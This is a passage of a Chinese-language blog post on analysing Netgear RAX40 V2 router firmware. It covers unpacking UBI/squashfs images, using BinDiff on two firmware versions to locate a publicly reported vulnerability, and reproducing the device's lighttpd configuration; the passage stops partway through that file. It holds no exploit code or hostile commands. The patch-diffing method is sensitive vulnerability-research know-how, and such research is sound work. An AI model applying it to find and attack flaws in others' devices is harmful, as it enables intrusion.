src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715144527110.png" alt="image-20210715144527110"></p><p>解开ubi 文件有两种方法,一个是通过挂载的方式, 一个是使用 ubi_reader 套件来解开，挂载的话过于麻烦，这里使用 ubi_reader 套件来解开. 我们需要<a href="https://github.com/jrspruitt/ubi_reader%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87PIP%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%EF%BC%9A%60sudo">https://github.com/jrspruitt/ubi_reader，可以通过PIP进行安装：`sudo</a> pip install ubi_reader&#96;， 使用 ubireader_extract_images 来进行解开ubi 的文件。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubireader_extract_images</span> <span class="hljs-number">3</span>A.ubi<br></code></pre></td></tr></table></figure><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715144847678.png" alt="image-20210715144847678"></p><p>解开之后 ubifs-root 文件内会生成四个ubifs 的文件 </p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715145136101.png" alt="image-20210715145136101"></p><p>根据前面对设备启动时的系统信息分析，rootfs_ubifs.ubifs 就是固件的文件系统。</p><p>使用binwalk 进行分析, 识别出来是squashfs 文件系统, 看样子是可以使用binwalk 解开固件</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715145448407.png" alt="image-20210715145448407"></p><p>成功解开 </p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715145609962.png" alt="image-20210715145609962"></p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715145623616.png" alt="image-20210715145623616"></p><h2 id="RAX40"><a href="#RAX40" class="headerlink" title="RAX40"></a>RAX40</h2><h3 id="公开的漏洞信息"><a href="#公开的漏洞信息" class="headerlink" title="公开的漏洞信息"></a>公开的漏洞信息</h3><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715141700044.png" alt="image-20210715141700044"></p><p>1 day 发现，漏洞挖掘方法</p><p>通过固件比对的方式来进行固件分析</p><p><a href="https://pup2y.github.io/2020/09/18/2020-qiang-wang-bei-jue-sai-cisco-lu-you-qi/">https://pup2y.github.io/2020/09/18/2020-qiang-wang-bei-jue-sai-cisco-lu-you-qi/</a></p><p>通过bindiff 对两个版本程序进行对比，从而对漏洞进行定位</p><p><a href="https://www.anquanke.com/post/id/200087">https://www.anquanke.com/post/id/200087</a></p><h3 id="安装bindiff-工具"><a href="#安装bindiff-工具" class="headerlink" title="安装bindiff 工具"></a>安装bindiff 工具</h3><p>（一） 、首先去官方下载，需要翻墙</p><p><a href="https://www.zynamics.com/software.html">https://www.zynamics.com/software.html</a></p><p>window 10 可以下载</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718190554095.png" alt="image-20210718190554095"></p><p>（二）、安装就好了，唯一要注意的是在自定义安装路径的时候，选在IDA的路径就好，我的安装路径是 （D:&#x2F;&#x2F;IDApro75&#x2F;IDApro75&#x2F;）</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718190800881.png" alt="image-20210718190800881"></p><h3 id="如何使用bindiff"><a href="#如何使用bindiff" class="headerlink" title="如何使用bindiff"></a>如何使用bindiff</h3><p>（一）、用IDA 打开你要对比分析的两个二进制程序，然后保存为   .ida （.ida64） 的格式。（注意：二进制程序保存的路径一定要是纯英文路径，不然会显示 “Error while diffing: Export of the secondary database failed: File not found”）。</p><p>（二）、打开一个二进制程序，然后快捷键Ctrl + 6 ，打开BinDiff，点击”Diff Database…”，选择将要进行对比分析的另一个二进制程序，加载进来就好。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718191915610.png" alt="image-20210718191915610"></p><p>（三）最终的界面如下图所示，增加了四个栏目</p><p>Prinary Umatched： 主文件没有匹配的函数</p><p>Secondary Unmatched : 对比文件中没有匹配的函数</p><p>Matched Functions : 表示两个文件的相似度，相似度从高到低排，相似度为 1 ,则表示两个文件高度相似的函数，值越低，说明改动越大。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718193341721.png" alt="image-20210718193341721"></p><p>然后使用bindiff.exe  创建workspce , 打开文件</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210719154927704.png" alt="image-20210719154927704"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718201355407.png" alt="image-20210718201355407"></p><p>进入这个函数</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718201444032.png" alt="image-20210718201444032"></p><p>结合 lighttpd5.conf 文件中的命令，可以推断出lighttpd的配置文件的路径。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718201541967.png" alt="image-20210718201541967"></p><p>查看 lighttpd5.conf 调用的地方，显示在 &#x2F;etc&#x2F;init.d&#x2F;lighttpd5 中调用，结合上面的命令，可以知道系统在启动的时候，会启动 lighttpd 的服务。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718202116746.png" alt="image-20210718202116746"></p><h2 id="lighttpd-相关学习"><a href="#lighttpd-相关学习" class="headerlink" title="lighttpd 相关学习"></a>lighttpd 相关学习</h2><p>根据RAX40 lighttpd 的逆向，了解到lighttpd 的版本为1.4.47 </p><p><a href="https://git.lighttpd.net/lighttpd/lighttpd1.4/src/tag/lighttpd-1.4.47">https://git.lighttpd.net/lighttpd/lighttpd1.4/src/tag/lighttpd-1.4.47</a></p><h3 id="主要的配置文件-lighttpd-conf"><a href="#主要的配置文件-lighttpd-conf" class="headerlink" title="主要的配置文件 lighttpd.conf"></a>主要的配置文件 lighttpd.conf</h3><p>下面的文件来自于RAX40 固件中的配置文件。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># lighttpd configuration file</span><br><span class="hljs-meta">#</span><br><span class="hljs-meta">## modules to load</span><br><span class="hljs-meta"># all other module should only be loaded if really neccesary</span><br><span class="hljs-meta"># - saves some time</span><br><span class="hljs-meta"># - saves memory</span><br><span class="hljs-meta"># 选择需要用到的模块</span><br>server.modules = (<br><span class="hljs-meta">#<span class="hljs-string">&quot;mod_rewrite&quot;</span>,</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;mod_redirect&quot;</span>,</span><br><span class="hljs-string">&quot;mod_alias&quot;</span>,<br><span class="hljs-string">&quot;mod_auth&quot;</span>,<br><span class="hljs-meta">#<span class="hljs-string">&quot;mod_status&quot;</span>,</span><br><span class="hljs-string">&quot;mod_setenv&quot;</span>,<br><span class="hljs-meta">#<span class="hljs-string">&quot;mod_fastcgi&quot;</span>,</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;mod_proxy&quot;</span>,</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;mod_simple_vhost&quot;</span>,</span><br><span class="hljs-string">&quot;mod_cgi&quot;</span>,<br><span class="hljs-meta">#<span class="hljs-string">&quot;mod_ssi&quot;</span>,</span><br><span class="hljs-string">&quot;mod_usertrack&quot;</span>,<br><span class="hljs-meta">#<span class="hljs-string">&quot;mod_expire&quot;</span>,</span><br><span class="hljs-string">&quot;mod_compress&quot;</span>,<br><span class="hljs-meta">#<span class="hljs-string">&quot;mod_webdav&quot;</span>,</span><br><span class="hljs-string">&quot;mod_openssl&quot;</span><br>)<br><br>include <span class="hljs-string">&quot;vendor_path.conf&quot;</span><br><br><span class="hljs-meta"># force use of the <span class="hljs-string">&quot;write&quot;</span> backend (closes: #2401)</span><br>server.network-backend = <span class="hljs-string">&quot;write&quot;</span><br><br><span class="hljs-meta">## a static document-root, for virtual-hosting take look at the </span><br><span class="hljs-meta">## server.virtual-* options</span><br><span class="hljs-meta"># 修改网站根目录路径</span><br>server.document-root = var.VendorPath+<span class="hljs-string">&quot;/www/&quot;</span><br><br>alias.url += ( <span class="hljs-string">&quot;/cgi-bin/&quot;</span> =&gt; <span class="hljs-string">&quot;/www/cgi-bin/&quot;</span> )<br>alias.url += ( <span class="hljs-string">&quot;/luci-static/&quot;</span> =&gt; <span class="hljs-string">&quot;/www/luci-static/&quot;</span> )<br><br><span class="hljs-meta">## where to send error-messages to</span><br><span class="hljs-meta"># 设置错误日志文件路劲</span><br><span class="hljs-meta">#server.errorlog = <span class="hljs-string">&quot;/var/log/lighttpd/error.log&quot;</span></span><br><br><span class="hljs-meta">## files to check for if .../ is requested</span><br>index-file.names = ( <span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-string">&quot;default.html&quot;</span>, <span class="hljs-string">&quot;index.htm&quot;</span>, <span class="hljs-string">&quot;default.htm&quot;</span> )<br><br><span class="hljs-meta">## mimetype mapping</span><br>mimetype.<span class="hljs-built_in">assign</span> = (<br><span class="hljs-string">&quot;.pdf&quot;</span>   =&gt; <span class="hljs-string">&quot;application/pdf&quot;</span>,<br><span class="hljs-string">&quot;.class&quot;</span> =&gt; <span class="hljs-string">&quot;application/octet-stream&quot;</span>,<br><span class="hljs-string">&quot;.pac&quot;</span>   =&gt; <span class="hljs-string">&quot;application/x-ns-proxy-autoconfig&quot;</span>,<br><span class="hljs-string">&quot;.swf&quot;</span>   =&gt; <span class="hljs-string">&quot;application/x-shockwave-flash&quot;</span>,<br><span class="hljs-string">&quot;.json&quot;</span>   =&gt; <span class="hljs-string">&quot;application/json&quot;</span>,<br><span class="hljs-string">&quot;.wav&quot;</span>   =&gt; <span class="hljs-string">&quot;audio/x-wav&quot;</span>,<br><span class="hljs-string">&quot;.gif&quot;</span>   =&gt; <span class="hljs-string">&quot;image/gif&quot;</span>,<br><span class="hljs-string">&quot;.jpg&quot;</span>   =&gt; <span class="hljs-string">&quot;image/jpeg&quot;</span>,<br><span class="hljs-string">&quot;.jpeg&quot;</span>  =&gt; <span class="hljs-string">&quot;image/jpeg&quot;</span>,<br><span class="hljs-string">&quot;.png&quot;</span>   =&gt; <span class="hljs-string">&quot;image/png&quot;</span>,<br><span class="hljs-string">&quot;.svg&quot;</span>   =&gt; <span class="hljs-string">&quot;image/svg+xml&quot;</span>,<br><span class="hljs-string">&quot;.css&quot;</span>   =&gt; <span class="hljs-string">&quot;text/css;charset=UTF-8&quot;</span>,<br><span class="hljs-string">&quot;.html&quot;</span>  =&gt; <span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>,<br><span class="hljs-string">&quot;.htm&quot;</span>   =&gt; <span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>,<br><span class="hljs-string">&quot;.js&quot;</span>    =&gt; <span class="hljs-string">&quot;text/javascript;charset=UTF-8&quot;</span>,<br><span class="hljs-string">&quot;.txt&quot;</span>   =&gt; <span class="hljs-string">&quot;text/plain;charset=UTF-8&quot;</span>,<br><span class="hljs-string">&quot;.dtd&quot;</span>   =&gt; <span class="hljs-string">&quot;text/xml;charset=UTF-8&quot;</span>,<br><span class="hljs-string">&quot;.xml&quot;</span>   =&gt; <span class="hljs-string">&quot;text/xml;charset=UTF-8&quot;</span><br> )<br><br><span class="hljs-meta">## Use the <span class="hljs-string">&quot;Content-Type&quot;</span> extended attribute to obtain mime type if possible</span><br><span class="hljs-meta">#mimetypes.use-xattr = <span class="hljs-string">&quot;enable&quot;</span></span><br><br><span class="hljs-meta">## send a different Server: header</span><br>server.tag = <span class="hljs-string">&quot;Unknown-Webserver/1.0&quot;</span><br><br>$HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;\.pdf$&quot;</span> &#123;<br>server.range-requests = <span class="hljs-string">&quot;disable&quot;</span><br>&#125;<br><br><span class="hljs-meta">##</span><br><span class="hljs-meta"># which extensions should not be handle via static-file transfer</span><br><span class="hljs-meta"># 这些文件后缀不能通过静态文件来处理</span><br><span class="hljs-meta"># .php, .pl, .fcgi are most often handled by mod_fastcgi or mod_cgi</span><br><span class="hljs-keyword">static</span>-file.exclude-extensions = ( <span class="hljs-string">&quot;.php&quot;</span>, <span class="hljs-string">&quot;.pl&quot;</span>, <span class="hljs-string">&quot;.fcgi&quot;</span> )<br><br><span class="hljs-meta">######### Options that are good to be but not neccesary to be changed #######</span><br><br><span class="hljs-meta">## bind to port (default: 80)</span><br><br>server.port = <span class="hljs-number">18080</span><br><br><span class="hljs-meta">## bind to localhost (default: all interfaces)</span><br><span class="hljs-meta">#server.bind = <span class="hljs-string">&quot;localhost&quot;</span></span><br><br><span class="hljs-meta">## Enable Ipv6 </span><br>server.bind = <span class="hljs-string">&quot;[::]&quot;</span><br>server.set-v6only = <span class="hljs-string">&quot;disable&quot;</span><br><br><span class="hljs-meta">## error-handler for status 404</span><br><span class="hljs-meta">#server.error-handler-404 = <span class="hljs-string">&quot;/error-handler.php&quot;</span></span><br><br><span class="hljs-meta">## to help the rc.scripts</span><br>server.pid-file = <span class="hljs-string">&quot;/var/run/lighttpd.pid&quot;</span><br><br><span class="hljs-meta">#cgi-bin</span><br>$HTTP[<span class="hljs-string">&quot;remoteip&quot;</span>] =~ <span class="hljs-string">&quot;127.0.0.1&quot;</span> &#123;<br>        alias.url += (<br>                <span class="hljs-string">&quot;/doc/&quot;</span> =&gt; <span class="hljs-string">&quot;/usr/share/doc/&quot;</span>,<br>                <span class="hljs-string">&quot;/images/&quot;</span> =&gt; <span class="hljs-string">&quot;/usr/share/images/&quot;</span><br>        )<br>        $HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;^/doc/|^/images/&quot;</span> &#123;<br>                dir-listing.activate = <span class="hljs-string">&quot;enable&quot;</span><br>        &#125;<br>        $HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;/cgi-bin/&quot;</span> &#123;<br>                cgi.<span class="hljs-built_in">assign</span> = ( <span class="hljs-string">&quot;&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span> )<br>        &#125;<br>        cgi.<span class="hljs-built_in">assign</span>      = (<br>                <span class="hljs-string">&quot;.cgi&quot;</span>  =&gt; <span class="hljs-string">&quot;&quot;</span><br>        )<br><br>&#125;<br><br>$HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;^/cgi-bin/&quot;</span> &#123;<br>        cgi.<span class="hljs-built_in">assign</span> = ( <span class="hljs-string">&quot;&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span> )<br>&#125;<br><br>$HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;^/cgi/&quot;</span> &#123;<br>        cgi.<span class="hljs-built_in">assign</span> = ( <span class="hljs-string">&quot;&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span> )<br>&#125;<br><br>cgi.<span class="hljs-built_in">assign</span>      = (<br>        <span class="hljs-string">&quot;.cgi&quot;</span>  =&gt; <span class="hljs-string">&quot;&quot;</span><br>)<br><br><br><span class="hljs-meta">####compress module</span><br>compress.allowed-encodings = (<span class="hljs-string">&quot;bzip2&quot;</span>, <span class="hljs-string">&quot;gzip&quot;</span>, <span class="hljs-string">&quot;deflate&quot;</span>)<br>compress.cache-dir          = <span class="hljs-string">&quot;/tmp/cache/lighttpd/compress/&quot;</span><br>compress.filetype           = (<span class="hljs-string">&quot;text/json&quot;</span>,<span class="hljs-string">&quot;text/plain&quot;</span>,<span class="hljs-string">&quot;text/css&quot;</span>, <span class="hljs-string">&quot;text/xml&quot;</span>, <span class="hljs-string">&quot;text/javascript&quot;</span>,<span class="hljs-string">&quot;application/javascript&quot;</span>,<span class="hljs-string">&quot;application/json&quot;</span>)<br><br><br><span class="hljs-meta">###### virtual hosts</span><br><span class="hljs-meta">##</span><br><span class="hljs-meta">##   If you want name-based virtual hosting add the next three settings and load</span><br><span class="hljs-meta">##   mod_simple_vhost</span><br><span class="hljs-meta">##</span><br><span class="hljs-meta">## document-root =</span><br><span class="hljs-meta">##   virtual-server-root + virtual-server-default-host + virtual-server-docroot or</span><br><span class="hljs-meta">##   virtual-server-root + http-host + virtual-server-docroot</span><br><span class="hljs-meta">##</span><br><span class="hljs-meta">#simple-vhost.server-root = <span class="hljs-string">&quot;/home/weigon/wwwroot/servers/&quot;</span></span><br><span class="hljs-meta">#simple-vhost.default-host = <span class="hljs-string">&quot;grisu.home.kneschke.de&quot;</span></span><br><span class="hljs-meta">#simple-vhost.document-root = <span class="hljs-string">&quot;/pages/&quot;</span></span><br><br><br><span class="hljs-meta">## </span><br><span class="hljs-meta">## Format: &lt;errorfile-prefix&gt;&lt;status&gt;.html</span><br><span class="hljs-meta">## -&gt; ..../status-404.html for <span class="hljs-string">&#x27;File not found&#x27;</span></span><br>server.errorfile-prefix = var.VendorPath+<span class="hljs-string">&quot;/www/error-&quot;</span><br><br><span class="hljs-meta">## virtual directory listings</span><br><span class="hljs-meta">#server.dir-listing = <span class="hljs-string">&quot;enable&quot;</span></span><br><br><span class="hljs-meta">## send unhandled HTTP-header headers to error-log</span><br><span class="hljs-meta">#debug.dump-unknown-headers = <span class="hljs-string">&quot;enable&quot;</span></span><br><br><span class="hljs-meta">### only root can use these options</span><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># chroot() to directory (default: no chroot() )</span><br><span class="hljs-meta">#server.chroot = <span class="hljs-string">&quot;/&quot;</span></span><br><br><span class="hljs-meta">## change uid to &lt;uid&gt; (default: don<span class="hljs-string">&#x27;t care)</span></span><br><span class="hljs-string"><span class="hljs-meta">#server.username = &quot;nobody&quot;</span></span><br><span class="hljs-string"><span class="hljs-meta">#</span></span><br><span class="hljs-string"><span class="hljs-meta">server.upload-dirs = ( &quot;/tmp&quot; )</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">## change uid to &lt;uid&gt; (default: don&#x27;</span>t care)</span><br><span class="hljs-meta">#server.groupname = <span class="hljs-string">&quot;nobody&quot;</span></span><br><br><span class="hljs-meta">#### compress module</span><br><span class="hljs-meta">#compress.cache-dir          = <span class="hljs-string">&quot;/dev/null/&quot;</span></span><br><span class="hljs-meta">#compress.filetype           = (<span class="hljs-string">&quot;text/plain&quot;</span>, <span class="hljs-string">&quot;text/html&quot;</span>)</span><br><br><span class="hljs-meta">#### proxy module</span><br><span class="hljs-meta">## read proxy.txt for more info</span><br><span class="hljs-meta">#proxy.server = (</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;.php&quot;</span> =&gt; (</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;localhost&quot;</span> =&gt; (</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;host&quot;</span> =&gt; <span class="hljs-string">&quot;192.168.0.101&quot;</span>,</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;port&quot;</span> =&gt; 80</span><br><span class="hljs-meta">#)</span><br><span class="hljs-meta">#)</span><br><span class="hljs-meta">#)</span><br><br><span class="hljs-meta">#### fastcgi module</span><br><span class="hljs-meta">## read fastcgi.txt for more info</span><br><span class="hljs-meta">#fastcgi.server = (</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;.php&quot;</span> =&gt; (</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;localhost&quot;</span> =&gt; (</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;socket&quot;</span> =&gt; <span class="hljs-string">&quot;/tmp/php-fastcgi.socket&quot;</span>,</span><br><span class="hljs-meta">#<span 